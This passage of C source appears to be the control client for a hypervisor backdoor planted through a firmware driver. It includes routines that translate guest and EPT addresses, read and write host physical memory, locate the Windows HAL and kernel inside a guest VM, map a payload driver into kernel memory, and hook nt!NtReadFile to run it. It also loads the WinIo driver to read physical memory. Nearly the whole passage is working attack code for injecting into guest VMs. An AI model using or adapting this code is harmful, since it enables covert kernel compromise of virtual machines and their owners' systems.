            X64_PAGE_TABLE_ENTRY_4K PT_entry;

            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);

            if (ept_addr != 0)
            {
                if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
                {
                    return -1;
                }
            }

            if (backdoor_phys_read_64(phys_addr, &PT_entry.Uint64) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                printf(
                    "  PTE 0x%llx[0x%llx]: 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    PT_entry.Uint64
                );
            }

            if (PT_entry.Bits.Present)
            {
                *ret = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) +
                       PAGE_OFFSET_4K(addr);

                if (ept_addr != 0)
                {
                    if (backdoor_phys_translate(*ret, ret, ept_addr) != 0)
                    {
                        return -1;
                    }
                }

                return 0;
            }
            else
            {
                printf("ERROR: PTE for 0x%llx is not present\n", addr);
            }
        }
        else
        {
            *ret = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) +
                   PAGE_OFFSET_2M(addr);

            if (ept_addr != 0)
            {
                if (backdoor_phys_translate(*ret, ret, ept_addr) != 0)
                {
                    return -1;
                }
            }

            return 0;
        }                  
    }
    else
    {
        printf("ERROR: 1G page\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_virt_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t pml4_addr, uint64_t ept_addr)
{
    uint64_t phys_addr = 0;

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    if (!m_quiet)
    {
        printf(__FUNCTION__"(): PML4 is at 0x%llx, VA is 0x%llx\n", pml4_addr, addr);
    }

    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "PML4E 0x%llx[0x%llx]: 0x%llx\n", 
            PML4_ADDRESS(pml4_addr), PML4_INDEX(addr), PML4_entry.Uint64
        );
    }

    if (PML4_entry.Bits.Present == 0)
    {
        printf("ERROR: PML4E for 0x%llx is not present\n", addr);
        return -1;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);

    if (ept_addr != 0)
    {
        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
        {
            return -1;
        }
    }

    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
    {
        return -1;
    }

    if (!m_quiet)
    {
        printf(
            "PDPTE 0x%llx[0x%llx]: 0x%llx\n", 
            PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress), PDPT_INDEX(addr), PDPT_entry.Uint64
        );
    }

    if (PDPT_entry.Bits.Present == 0)
    {
        printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
        return -1;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);

        if (ept_addr != 0)
        {
            if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
            {
                return -1;
            }
        }

        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
        {
            return -1;
        }

        if (!m_quiet)
        {
            printf(
                "  PDE 0x%llx[0x%llx]: 0x%llx\n", 
                PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress), PDE_INDEX(addr), 
                PD_entry.Uint64
            );
        }

        if (PD_entry.Bits.Present == 0)
        {
            printf("ERROR: PDE for 0x%llx is not present\n", addr);
            return -1;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);

            if (ept_addr != 0)
            {
                if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
                {
                    return -1;
                }
            }

            if (backdoor_phys_read_64(phys_addr, old) != 0)
            {
                return -1;
            }

            if (!m_quiet)
            {
                printf(
                    "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                    PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                    *old, entry
                );
            }

            if (backdoor_phys_write_64(phys_addr, entry) != 0)
            {
                return -1;
            }

            return 0;
        }
        else
        {
            printf("ERROR: 2M page\n");
        }                  
    }
    else
    {
        printf("ERROR: 1G page\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int backdoor_vm_inject(uint64_t pml4_addr, unsigned char *payload, int payload_size)
{
    int ret = 0;
    uint64_t phys_addr = 0;
    uint8_t *saved_data = NULL;

    printf("[+] Guest EPT at 0x%.16llx\n", pml4_addr);

    // get host physical address of PROCESSOR_START_BLOCK
    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR, &phys_addr, pml4_addr) != 0)
    {
        return -1;
    }
    
    printf("[+] Found valid PROCESSOR_START_BLOCK at 0x%.16llx\n", phys_addr);

    void *data = malloc(PAGE_SIZE);
    if (data)
    {
        if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
        {
            goto _end;
        }

        PROCESSOR_START_BLOCK *info = (PROCESSOR_START_BLOCK *)data;

        if (info->Jmp.OpCode != 0xe9 || info->CompletionFlag != 1)
        {
            printf("ERROR: Bad PROCESSOR_START_BLOCK\n");
            goto _end;
        }

        uint64_t hal_lm_stub = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_HalpLMStub);
        uint64_t guest_pml4_addr = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_Cr3);

        printf("\n   CompletionFlag: 0x%.8x\n", info->CompletionFlag);
        printf("            Gdt32: 0x%.8x, limit = %.4x\n", info->Gdt32.Base, info->Gdt32.Limit);
        printf("            Idt32: 0x%.8x, limit = %.4x\n", info->Gdt32.Base, info->Gdt32.Limit);
        printf(" hal!HalpLMStub(): 0x%llx\n", hal_lm_stub);
        printf("     PML4 address: 0x%llx\n\n", guest_pml4_addr);
            
        uint64_t hal_base_virt = _ALIGN_DOWN(hal_lm_stub, PAGE_SIZE);
        uint64_t hal_base_phys = 0;
        uint32_t hal_size = 0;

        uint32_t hal_idata_addr = 0;
        uint32_t hal_idata_size = 0;

        while (hal_lm_stub - hal_base_virt < PAGE_SIZE * 0x100)
        {
            m_quiet = true;

            if (backdoor_virt_translate(hal_base_virt, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
            {
                m_quiet = false;  

                goto _end;
            }

            m_quiet = false;

            uint16_t signature = 0;

            if (backdoor_phys_read_16(phys_addr, &signature) != 0)
            {
                goto _end;
            }

            if (signature == IMAGE_DOS_SIGNATURE)
            {
                uint32_t buff[PAGE_SIZE];

                if (backdoor_phys_read(phys_addr, buff, sizeof(buff)) != 0)
                {
                    goto _end;
                }

                IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                    RVATOVA(buff, ((IMAGE_DOS_HEADER *)buff)->e_lfanew);

                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);

                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                {
                    if (!strncmp((char *)&sec->Name, ".idata", 6))
                    {
                        hal_idata_addr = sec->VirtualAddress;
                        hal_idata_size = sec->Misc.VirtualSize;
                        break;
                    }

                    sec += 1;
                }

                hal_base_phys = phys_addr;
                hal_size = hdr->OptionalHeader.SizeOfImage;
                break;
            }            

            hal_base_virt -= PAGE_SIZE;
        }

        if (hal_base_phys == 0 || hal_size == 0)
        {
            printf("ERROR: Unable to locate HAL image\n");
            goto _end;
        }

        if (hal_idata_addr == 0 || hal_idata_size == 0)
        {
            printf("ERROR: Unable to locate '.idata' section of HAL image\n");
            goto _end;
        }

        printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_base_virt, hal_base_phys);

        uint64_t nt_base_virt = 0;
        uint64_t nt_base_phys = 0;
        uint32_t nt_size = 0;

        hal_size = _ALIGN_UP(hal_size, PAGE_SIZE);

        void *hal_image = malloc(hal_size);
        if (hal_image)
        {
            memset(hal_image, 0, hal_size);

            for (uint32_t i = 0; i < hal_size; i += PAGE_SIZE)
            {
                if (i == 0 || (i >= hal_idata_addr && i < hal_idata_addr + hal_idata_size))
                {
                    m_quiet = true;

                    if (backdoor_virt_translate(hal_base_virt + i, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
                    {
                        m_quiet = false;
                        continue;
                    }

                    m_quiet = false;

                    if (backdoor_phys_read(phys_addr, (uint8_t *)hal_image + i, PAGE_SIZE) != 0)
                    {
                        free(hal_image);
                        goto _end;
                    }
                }                
            }

            IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                RVATOVA(hal_image, ((IMAGE_DOS_HEADER *)hal_image)->e_lfanew);

            uint32_t imp_addr = hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

            if (imp_addr != 0)
            {
                uint32_t imp_size = hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

                IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)RVATOVA(hal_image, imp_addr);

                // first import thunk of hal is ntoskrnl
                uint64_t *imp_thunk = (uint64_t *)RVATOVA(hal_image, imp->FirstThunk);
                                
                // get ntoskrnl pointer
                nt_base_virt = _ALIGN_DOWN(*imp_thunk, PAGE_SIZE);                
            }

            free(hal_image);
        }
        else
        {
            goto _end;
        }

        if (nt_base_virt == 0)
        {
            printf("ERROR: Unable to locate kernel pointer\n");
            goto _end;
        }

        uint32_t ptr = 0;
        uint32_t nt_edata_addr = 0;
        uint32_t nt_edata_size = 0;
        uint32_t nt_init_addr = 0;
        uint32_t nt_init_size = 0;
        uint32_t nt_pagekd_addr = 0;
        uint32_t nt_pagekd_size = 0;

        while (ptr < PAGE_SIZE * 0x100)
        {
            m_quiet = true;

            if (backdoor_virt_translate(nt_base_virt, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
            {
                m_quiet = false;  

                goto _end;
            }

            m_quiet = false;

            uint16_t signature = 0;

            if (backdoor_phys_read_16(phys_addr, &signature) != 0)
            {
                goto _end;
            }

            if (signature == IMAGE_DOS_SIGNATURE)
            {
                uint32_t buff[PAGE_SIZE];

                if (backdoor_phys_read(phys_addr, buff, sizeof(buff)) != 0)
                {
                    goto _end;
                }

                IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                    RVATOVA(buff, ((IMAGE_DOS_HEADER *)buff)->e_lfanew);

                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);

                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                {
                    if (!strncmp((char *)&sec->Name, ".edata", 6))
                    {
                        nt_edata_addr = sec->VirtualAddress;
                        nt_edata_size = sec->Misc.VirtualSize;
                    }
                    else if (!strncmp((char *)&sec->Name, "INIT", 4))
                    {
                        nt_init_addr = sec->VirtualAddress;
                        nt_init_size = sec->Misc.VirtualSize;
                    }
                    else if (!strncmp((char *)&sec->Name, "PAGEKD", 6))
                    {
                        nt_pagekd_addr = sec->VirtualAddress;
                        nt_pagekd_size = sec->Misc.VirtualSize;
                    }

                    sec += 1;
                }

                nt_base_phys = phys_addr;
                nt_size = hdr->OptionalHeader.SizeOfImage;
                break;
            }            

            nt_base_virt -= PAGE_SIZE;
            ptr += PAGE_SIZE;
        }

        if (nt_base_phys == 0 || nt_size == 0)
        {
            printf("ERROR: Unable to locate kernel base\n");
            goto _end;
        }

        if (nt_edata_addr == 0 || nt_edata_size == 0)
        {
            printf("ERROR: Unable to locate '.edata' section of kernel image\n");
            goto _end;
        }

        if (nt_init_addr == 0 || nt_init_size == 0)
        {
            printf("ERROR: Unable to locate 'INIT' section of kernel image\n");
            goto _end;
        }

        if (nt_pagekd_addr == 0 || nt_pagekd_size == 0)
        {
            printf("ERROR: Unable to locate 'PAGEKD' section of kernel image\n");
            goto _end;
        }

        printf("[+] Kernel is at 0x%llx (physical: 0x%llx)\n", nt_base_virt, nt_base_phys);
        printf("[+] Kernel INIT section is at nt+%x (size: 0x%x)\n", nt_init_addr, nt_init_size);
        printf("[+] Kernel PAGEKD section is at nt+%x (size: 0x%x)\n", nt_pagekd_addr, nt_pagekd_size);

        uint64_t nt_func_virt = 0;
        uint64_t nt_func_phys = 0;

        nt_size = _ALIGN_UP(nt_size, PAGE_SIZE);

        void *nt_image = malloc(nt_size);
        if (nt_image)
        {
            memset(nt_image, 0, nt_size);

            for (uint32_t i = 0; i < nt_size; i += PAGE_SIZE)
            {
                if (i == 0 || (i >= nt_edata_addr && i < nt_edata_addr + nt_edata_size))
                {
                    m_quiet = true;    

                    if (backdoor_virt_translate(nt_base_virt + i, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
                    {
                        m_quiet = false;
                        continue;
                    }

                    m_quiet = false;

                    if (backdoor_phys_read(phys_addr, (uint8_t *)nt_image + i, PAGE_SIZE) != 0)
                    {
                        free(nt_image);
                        goto _end;
                    }
                }                
            }

            uint32_t rva = LdrGetProcAddress(nt_image, "NtReadFile");
            if (rva == 0)
            {
                printf("ERROR: Unable to locate nt!NtReadFile()\n");

                free(nt_image);
                goto _end;   
            }

            nt_func_virt = nt_base_virt + rva;

            m_quiet = true;    

            if (backdoor_virt_translate(nt_func_virt, &nt_func_phys, guest_pml4_addr, pml4_addr) != 0)
            {
                m_quiet = false;
                
                free(nt_image);
                goto _end; 
            }

            m_quiet = false;

            free(nt_image);
        }
        else
        {
            goto _end;
        }

        if (nt_func_virt == 0 || nt_func_phys == 0)
        {
            printf("ERROR: Unable to locate nt!NtReadFile()\n");
            goto _end;
        }

        printf("[+] nt!NtReadFile() is at 0x%llx (physical: 0x%llx)\n", nt_func_virt, nt_func_phys);
        
        uint32_t driver_size = _ALIGN_UP(payload_size, PAGE_SIZE);

        uint64_t driver_base_virt = nt_base_virt + nt_pagekd_addr + \
                                    _ALIGN_UP(nt_pagekd_size, PAGE_SIZE) - driver_size;

        uint32_t driver_m_Kernel = 0;
        uint32_t driver_m_Driver = 0;
        uint32_t driver_new_NtReadFile = 0;
        uint32_t driver_old_NtReadFile = 0;

        uint8_t nt_func_buff[DRIVER_HOOK_SIZE_MAX];
        uint8_t nt_func_jump[DRIVER_HOOK_SIZE];
        uint32_t nt_func_saved_size = 0;

        printf("[+] Kernel driver virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, driver_size);
        
        uint8_t *driver_image = (uint8_t *)malloc(driver_size);
        if (driver_image)
        {
            memset(driver_image, 0, driver_size);
            memcpy(driver_image, payload, payload_size);

            if (!LdrProcessRelocs(driver_image, (void *)driver_base_virt))
            {
                printf("ERROR: Unable to relocate driver image\n");

                free(driver_image);
                goto _end;
            }

            driver_m_Kernel = LdrGetProcAddress(driver_image, "m_Kernel");
            driver_m_Driver = LdrGetProcAddress(driver_image, "m_Driver");
            driver_new_NtReadFile = LdrGetProcAddress(driver_image, "new_NtReadFile");
            driver_old_NtReadFile = LdrGetProcAddress(driver_image, "old_NtReadFile");

            if (driver_m_Kernel == 0 || driver_m_Driver == 0 ||
                driver_new_NtReadFile == 0 || driver_old_NtReadFile == 0)
            {
                printf("ERROR: Unable to locate needed driver image exports\n");

                free(driver_image);
                goto _end;   
            }

            // set up driver global variables
            *(uint64_t *)(driver_image + driver_m_Kernel) = nt_base_virt;
            *(uint64_t *)(driver_image + driver_m_Driver) = driver_base_virt;

            // save old code of kernel function to hook
            if (backdoor_phys_read(nt_func_phys, nt_func_buff, DRIVER_HOOK_SIZE_MAX) != 0)
            {
                free(driver_image);
                goto _end;      
            }

            // initialize disassembler engine
            ud_t ud_obj;
            ud_init(&ud_obj);

            // set mode, syntax and vendor
            ud_set_mode(&ud_obj, 64);
            ud_set_vendor(&ud_obj, UD_VENDOR_INTEL);

            uint32_t inst_ptr = 0;

            while (nt_func_saved_size < DRIVER_HOOK_SIZE)
            {
                ud_set_input_buffer(&ud_obj, nt_func_buff + inst_ptr, DRIVER_HOOK_SIZE_MAX - inst_ptr);

                // get length of instruction
                uint32_t inst_len = ud_disassemble(&ud_obj);
                if (inst_len == 0)
                {
                    // error while disassembling instruction
                    printf("ERROR: Can't disassemble instruction at offset %d\n", inst_ptr);
                    break;
                }

                if (ud_obj.mnemonic == UD_Ijmp || ud_obj.mnemonic == UD_Icall)
                {
                    // call/jmp with relative address
                    printf("ERROR: call/jmp/jxx instruction at offset %d\n", inst_ptr);
                    break; 
                }

                for (int i = 0; i < 3; i++)
                {
                    if (ud_obj.operand[i].type == UD_OP_JIMM)
                    {
                        // jxx with relative address
                        printf("ERROR: jxx instruction at offset %d\n", inst_ptr);
                        break;
                    }

                    if (ud_obj.operand[i].base == UD_R_RIP)
                    {
                        // RIP relative operand
                        printf("ERROR: RIP-relative instruction at offset %d\n", inst_ptr);
                        break;
                    }
                }

                inst_ptr += inst_len;
                nt_func_saved_size += inst_len;

                if (ud_obj.mnemonic == UD_Ijmp  ||
                    ud_obj.mnemonic == UD_Iret  ||
                    ud_obj.mnemonic == UD_Iretf ||
                    ud_obj.mnemonic == UD_Iiretw   ||
                    ud_obj.mnemonic == UD_Iiretq   ||
                    ud_obj.mnemonic == UD_Iiretd)
                {
                    // end of the function thunk?
                    break;
                }
            }

            if (DRIVER_HOOK_SIZE > nt_func_saved_size)
            {
                printf(
                    "ERROR: Not enough memory for jump (%d bytes found, %d required)\n", 
                    nt_func_saved_size, DRIVER_HOOK_SIZE
                );

                free(driver_image);
                goto _end;  
            }

            printf("[+] Hook size is %d bytes\n", nt_func_saved_size);

            memcpy(driver_image + driver_old_NtReadFile, nt_func_buff, nt_func_saved_size);

            // mov rax, addr
            *(uint16_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size) = 0xb848;
            *(uint64_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size + 2) = \
                nt_func_virt + nt_func_saved_size;

            // jmp rax ; from callgate to function
            *(uint16_t *)(driver_image + driver_old_NtReadFile + nt_func_saved_size + 10) = 0xe0ff;

            if ((saved_data = (uint8_t *)malloc(driver_size)) == NULL)
            {
                free(driver_image);
                goto _end;      
            }

            for (uint32_t i = 0; i < driver_size; i += PAGE_SIZE)
            {   
                m_quiet = true;  

                // get host physical address of driver page
                if (backdoor_virt_translate(driver_base_virt + i, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
                {
                    m_quiet = false;  

                    free(driver_image);
                    goto _end;
                }

                m_quiet = false;  

                // backup physical memory contents
                if (backdoor_phys_read(phys_addr, saved_data + i, PAGE_SIZE) != 0)
                {
                    free(driver_image);
                    goto _end;   
                }

                // copy driver image into the physical memory
                if (backdoor_phys_write(phys_addr, driver_image + i, PAGE_SIZE) != 0)
                {
                    free(driver_image);
                    goto _end;   
                }
            }

            free(driver_image);
        }
        else
        {
            goto _end;
        }   

        printf("[+] Kernel driver mapped to the 0x%llx\n", driver_base_virt);

        IMAGE_DOS_HEADER hdr;

        if (backdoor_phys_read(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
        {
            goto _end;
        }

        hdr.e_res[0] = 0x0000;

        if (backdoor_phys_write(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
        {
            goto _end;
        }

        // mov rax, cr3
        *(uint32_t *)nt_func_jump =  0xd8200f90;

        // mov cr3, rax
        *(uint32_t *)(nt_func_jump + 4) =  0x90d8220f;

        // mov rax, addr
        *(uint16_t *)(nt_func_jump + 8) = 0xb848;
        *(uint64_t *)(nt_func_jump + 10) = driver_base_virt + driver_new_NtReadFile;

        // jmp rax ; from function to handler
        *(uint16_t *)(nt_func_jump + 18) = 0xe0ff;   

        if (backdoor_phys_write(nt_func_phys, nt_func_jump, DRIVER_HOOK_SIZE) != 0)
        {
            goto _end;   
        }

        backdoor_invalidate_caches();

        printf(
            "[+] nt!NtReadFile() hook was set: 0x%llx -> 0x%llx\n", 
            nt_func_virt, driver_base_virt + driver_new_NtReadFile
        );

        while (true)
        {
            // read kernel image header
            if (backdoor_phys_read(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
            {
                goto _end;
            }

            // check if kernel driver was executed
            if (hdr.e_res[0] == 0xffff)
            {
                printf("[+] Kernel driver was executed!\n");
                break;
            }

            SwitchToThread();
        }

        printf("[+] Performing cleanup...\n");

        if (backdoor_phys_write(nt_func_phys, nt_func_buff, nt_func_saved_size) != 0)
        {
            goto _end;   
        }

        Sleep(1000);

        for (uint32_t i = 0; i < driver_size; i += PAGE_SIZE)
        {   
            m_quiet = true;  

            // get host physical address of driver page
            if (backdoor_virt_translate(driver_base_virt + i, &phys_addr, guest_pml4_addr, pml4_addr) != 0)
            {
                m_quiet = false;  

                goto _end;
            }

            m_quiet = false;  

            // backup physical memory contents
            if (backdoor_phys_write(phys_addr, saved_data + i, PAGE_SIZE) != 0)
            {
                goto _end;   
            }
        }

        hdr.e_res[0] = 0x0000;

        if (backdoor_phys_write(nt_base_phys, (void *)&hdr, sizeof(IMAGE_DOS_HEADER)) != 0)
        {
            goto _end;
        }
        
        printf("[+] DONE\n");

        ret = 0;
_end:
        if (saved_data)
        {
            free(saved_data);
        }

        free(data);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int load_privileges(char *name)
{
    int ret = -1;
    HANDLE token = NULL;    
    TOKEN_PRIVILEGES privs;
    LUID val;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
    {
        printf("OpenProcessToken() ERROR %d\n", GetLastError());
        goto _end;
    }

    if (!LookupPrivilegeValueA(NULL, name, &val))
    {
        printf("LookupPrivilegeValue() ERROR %d\n", GetLastError());
        goto _end;
    }

    privs.PrivilegeCount = 1;
    privs.Privileges[0].Luid = val;
    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &privs, sizeof (privs), NULL, NULL))
    {
        printf("AdjustTokenPrivileges() ERROR %d\n", GetLastError());
        goto _end;
    }

    ret = 0;

_end:

    if (token)
    {
        CloseHandle(token);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int backdoor_read_debug_messages(void)
{    
    int ret = -1;    
    wchar_t *var_name = BACKDOOR_VAR_NAME, var_guid[MAX_PATH];
    GUID guid = BACKDOOR_VAR_GUID;
    uint64_t address = 0;

    swprintf(
        var_guid, L"{%.8x-%.4x-%.4x-%.2x%.2x-%.2x%.2x%.2x%.2x%.2x%.2x}",
        guid.Data1, guid.Data2, guid.Data3,
        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]
    );

    // obtain needed privileges
    if (load_privileges(SE_SYSTEM_ENVIRONMENT_NAME) != 0)
    {
        printf("ERROR: Unable to obtain %s privilege\n", SE_SYSTEM_ENVIRONMENT_NAME);
        return -1;
    }

    printf("[+] Reading firmware variable %ws %ws\n", var_name, var_guid);

    // get debug messages buffer address
    if (GetFirmwareEnvironmentVariableW(var_name, var_guid, (void *)&address, sizeof(address)) != sizeof(address))
    {
        printf("GetFirmwareEnvironmentVariable() ERROR %d\n", GetLastError());
        printf("ERROR: Unable to get debug messages buffer address\n");
        return -1;
    }    

    char driver_path[MAX_PATH];
    char *driver_name = WINIO_DRIVER_NAME, *device_path = WINIO_DEVICE_PATH;

    GetSystemDirectory(driver_path, MAX_PATH);
    strcat_s(driver_path, "\\drivers\\");
    strcat_s(driver_path, driver_name);

    // copy driver into the system folder
    if (!CopyFile(driver_name, driver_path, FALSE))
    {
        printf("CopyFile() ERROR %d\n", GetLastError());
        printf("ERROR: Unable to copy \"%s\" into the \"%s\"\n", driver_name, driver_path);
        return -1;
    }

    bool already_started = FALSE, stop = FALSE;

    printf("[+] Loading WinIo driver...\n");

    HANDLE fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (fd == INVALID_HANDLE_VALUE)
    {
        // create and start service
        if (service_start(WINIO_SERVICE_NAME, driver_path, &already_started))
        {
            stop = !already_started;

            printf("[+] WinIo driver was loaded\n");

            // open driver device
            fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (fd == INVALID_HANDLE_VALUE)
            {
                printf("CreateFile() ERROR %d\n", GetLastError());
                printf("ERROR: Unable to open \"%s\"\n", device_path);
                goto _end;
            }
        }
        else
        {
            printf("ERROR: Unable to load WinIo driver\n");
            goto _end;
        }
    }    
    else
    {
        printf("[+] WinIo driver is already loaded\n");
    }

    if (fd != INVALID_HANDLE_VALUE)
    {   
        char *buff = (char *)malloc(DEBUG_OUTPUT_SIZE);
        if (buff)
        {
            memset(buff, 0, DEBUG_OUTPUT_SIZE);

            printf("[+] Reading physical memory at 0x%llx\n", address);

            // read debug messages buffer 
            if (winio_phys_mem_read(fd, address, DEBUG_OUTPUT_SIZE, buff) == 0)
            {
                // print debug messages to the screen
                printf("\n%s\n", buff);

                ret = 0;
            }
            else
            {
                printf("ERROR: Unable to read debug messages buffer\n");
            }

            free(buff);
        }

        CloseHandle(fd);
    }

_end:

    if (stop)
    {
        // stop and delete service
        service_stop(WINIO_SERVICE_NAME);
        service_remove(WINIO_SERVICE_NAME);
    }

    DeleteFile(driver_path);

    return ret;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    uint32_t cpu = 0;

    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);    

    if (argc >= 2 && !strcmp(argv[1], "--debug"))
    {
        // readd and print backdoor DXE driver debug messages buffer
        return backdoor_read_debug_messages();
    }

    if (argc >= 2)
    {
        cpu = strtoul(argv[1], NULL, 16);

        if (errno == EINVAL)
        {
            printf("ERROR: Invalid CPU number\n");
            return -1;
        }

        if (cpu >= sys_info.dwNumberOfProcessors)
        {
            printf("ERROR: Bad CPU number\n");
            return -1;
        }        
    }

    SetThreadAffinityMask(GetCurrentThread(), (uint64_t)(1 << cpu));

    printf("[+] Running on CPU #%x\n", cpu);

    if (argc <= 2)
    {
        HVBD_INFO info;

        // no command specified, print hypervisor information
        if (backdoor_info(&info) == 0)
        {
            printf("[+] VM exit backdoor is present\n\n");

            printf("      Hypervisor CR0: 0x%llx\n", info.cr0);
            printf("      Hypervisor CR3: 0x%llx\n", info.cr3);
            printf("      Hypervisor CR4: 0x%llx\n", info.cr4);
            printf(" Hypervisor IDT base: 0x%llx (limit = 0x%x)\n", info.idt_base, info.idt_limit);
            printf("  Hypervisor GS base: 0x%llx\n", info.gs_base);
            printf("     VM exit handler: 0x%llx\n", info.vm_exit_addr);
            printf("       VM exit count: 0x%llx\n\n", info.vm_exit_count);
        }

        printf("Press any key to quit...\n");
        _getch();
    }
    else
    {
        char *command = argv[2];

        if (!strcmp(command, "--virt-read") && argc >= 5)
        {
            // read virtual memory at given address
            uint64_t addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            uint32_t size = strtoul(argv[4], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid size\n");
                return -1;
            }

            printf("[+] Reading 0x%x bytes of virtual memory at 0x%llx\n\n", size, addr);

            uint8_t *buff = (uint8_t *)malloc(size);
            if (buff)
            {
                if (backdoor_virt_read(addr, buff, size) == 0)
                {
                    hexdump(buff, size, addr);
                }

                free(buff);
            }
        }
        else if (!strcmp(command, "--virt-translate") && argc >= 5)
        {
            // translate virtual address to physical
            uint64_t phys_addr = 0, ept_addr = 0;
            uint64_t pml4_addr = strtoull(argv[3], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid PML4 address\n");
                return -1;
            }

            uint64_t addr = strtoull(argv[4], NULL, 16);            

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            if (argc >= 6)
            {
                ept_addr = strtoull(argv[5], NULL, 16);            

                if (errno == EINVAL)
                {
                    printf("ERROR: Invalid EPT address\n");
                    return -1;
                }
            }

            if (backdoor_virt_translate(addr, &phys_addr, pml4_addr, ept_addr) == 0)
            {
                printf("\n0x%.16llx -> 0x%.16llx\n", addr, phys_addr);
            }
        }
        else if (!strcmp(command, "--phys-read") && argc >= 5)
        {
            // read virtual memory at given address
            uint64_t addr = strtoull(argv[3], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid address\n");
                return -1;
            }

            uint32_t size = strtoul(argv[4], NULL, 16);

            if (errno == EINVAL)
            {
                printf("ERROR: Invalid size\n");
                return -1;
            }

            printf("[+] Reading 0x%x bytes of physical memory at 0x%llx\n\n", size, addr);

            uint8_t *buff = (uint8_t *)malloc(size);
            if (buff)
            {
